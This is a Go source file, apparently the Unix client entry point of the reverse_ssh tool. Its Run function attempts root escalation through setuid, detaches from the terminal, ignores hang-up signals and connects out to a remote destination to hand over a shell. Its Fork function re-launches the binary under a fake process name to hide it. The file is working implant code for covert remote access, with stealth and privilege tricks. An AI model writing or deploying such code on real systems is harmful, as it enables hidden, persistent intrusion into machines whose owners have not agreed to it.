//go:build !windows

package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func Run(destination, fingerprint, proxyaddress, sni string, _ bool) {
	//Try to elavate to root (in case we are a root:root setuid/gid binary)
	syscall.Setuid(0)
	syscall.Setgid(0)

	//Create our own process group, and ignore any  hang up signals
	syscall.Setsid()
	signal.Ignore(syscall.SIGHUP, syscall.SIGPIPE)

	// on the linux platform we cant use winauth
	client.Run(destination, fingerprint, proxyaddress, sni, false)
}

func Fork(destination, fingerprint, proxyaddress, sni string, _ bool, pretendArgv ...string) error {

	log.Println("Forking")

	err := fork("/proc/self/exe", nil, pretendArgv...)
	if err != nil {
		log.Println("Forking from /proc/self/exe failed: ", err)

		binary, err := os.Executable()
		if err == nil {
			err = fork(binary, nil, pretendArgv...)
		}

		log.Println("Forking from argv[0] failed: ", err)
		return err
	}
	return nil
}
